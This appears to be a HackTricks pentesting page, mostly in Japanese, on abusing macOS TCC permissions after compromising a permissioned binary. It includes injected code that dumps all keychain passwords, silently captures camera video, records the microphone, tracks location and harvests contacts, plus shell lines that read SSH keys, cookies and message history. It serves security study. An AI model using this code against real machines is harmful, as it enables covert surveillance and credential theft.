# TCC PermissionsによるmacOS Credential & Data Theft

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

macOS TCC (Transparency, Consent, and Control) は、機密性の高いユーザーデータへのアクセスを保護します。攻撃者が**すでにTCC grantsを持つbinaryをcompromise**すると、そのpermissionsを引き継ぎます。このページでは、data-theftに関連する各TCC permissionの悪用可能性について説明します。<sup>[[2]](#references)</sup>

> [!WARNING]
> TCC-granted binaryへのcode injection（DYLD injection、dylib hijacking、またはtask port経由）では、**そのbinaryのすべてのTCC permissionsが無条件で引き継がれます**。同じprocessが保護されたdataを読み取る際に、追加のpromptやverificationはありません。<sup>[[4]](#references)</sup>

---

## Keychain Access Groups

### The Prize

macOS Keychainには以下が保存されます。
- **Wi-Fi passwords** — 保存済みワイヤレスネットワークのすべてのcredentials
- **Website passwords** — Safari、Chrome（Keychainを使用する場合）、その他のbrowser passwords
- **Application passwords** — email accounts、VPN credentials、development tokens
- **Certificates and private keys** — code signing、client TLS、S/MIME encryption
- **Secure notes** — ユーザーが保存したsecrets

### Entitlement: `keychain-access-groups`

Keychain itemsは**access groups**に整理されています。アプリケーションの`keychain-access-groups` entitlementには、アクセス可能なgroupsが一覧化されています。<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## カメラアクセス (kTCCServiceCamera)

### Exploitation

カメラのTCC grant（`kTCCServiceCamera` または `com.apple.security.device.camera` entitlement経由）を持つバイナリは、写真や動画をキャプチャできます：
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> **macOS Sonoma** 以降では、メニューバーのカメラインジケーターは常時表示され、プログラムによって非表示にすることはできません。**macOS** の旧バージョンでは、短時間のキャプチャでは目立つインジケーターが表示されない場合があります。

---

## マイクアクセス（kTCCServiceMicrophone）

### Exploitation

マイクアクセスにより、内蔵マイク、ヘッドセット、または接続されたオーディオ入力デバイスからすべての音声をキャプチャできます：
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attack: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 位置情報の追跡 (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 継続的な追跡
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 連絡先 / カレンダー / 写真

### 個人データの Exfiltration

| TCC Service | Framework | Data |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 氏名、メールアドレス、電話番号、住所 |
| `kTCCServiceCalendar` | `EventKit` | 会議、参加者、場所 |
| `kTCCServicePhotos` | `Photos.framework` | 写真、スクリーンショット、位置情報メタデータ |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 連絡先の収集
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloudアカウントアクセス

### Entitlement: `com.apple.private.icloud-account-access`

このentitlementにより、`com.apple.iCloudHelper` XPC serviceとの通信が可能になり、以下へのアクセスが提供されます。
- **iCloud tokens** — ユーザーのApple IDの認証トークン
- **iCloud Drive** — すべてのデバイスから同期されたドキュメント
- **iCloud Keychain** — すべてのAppleデバイス間で同期されたパスワード
- **Find My** — ユーザーのすべてのAppleデバイスの位置情報<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> iCloud-entitled binary を侵害すると、攻撃範囲が**単一のデバイスから Apple エコシステム全体へ拡大**します: 他の Mac、iPhone、iPad、Apple Watch。iCloud Keychain の同期により、すべてのデバイスのパスワードにアクセスできます。

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### 最も強力な TCC Permission

Full Disk Access は、以下を含む**システム上のすべてのファイル**への読み取り権限を付与します:
- 他のアプリのデータ（Messages、Mail、Safari の履歴）
- TCC データベース（他のすべての権限を明らかにする）
- SSH keys と設定
- Browser cookies と session tokens
- Application databases と caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

TCC の権限が付与された、injectable なバイナリを評価する際は、データの価値に基づいて優先順位を付けます。

| Priority | TCC Permission | Why |
|---|---|---|
| **Critical** | Full Disk Access | すべてへのアクセス |
| **Critical** | TCC Manager | あらゆる権限を付与可能 |
| **High** | Keychain Access Groups | 保存されているすべてのパスワード |
| **High** | iCloud Account Access | 複数デバイスの侵害 |
| **High** | Input Monitoring (ListenEvent) | keylogging |
| **High** | Accessibility | GUI control、self-granting |
| **Medium** | Screen Capture | 視覚データの取得 |
| **Medium** | Camera + Microphone | 監視 |
| **Medium** | Contacts + Calendar | ソーシャルエンジニアリングに利用できるデータ |
| **Low** | Location | 物理的な追跡 |
| **Low** | Photos | 個人データ |

## 列挙スクリプト
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — 「Macで起きたことは、AppleのiCloudに残るのか？！」（Wojciech Regula）](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
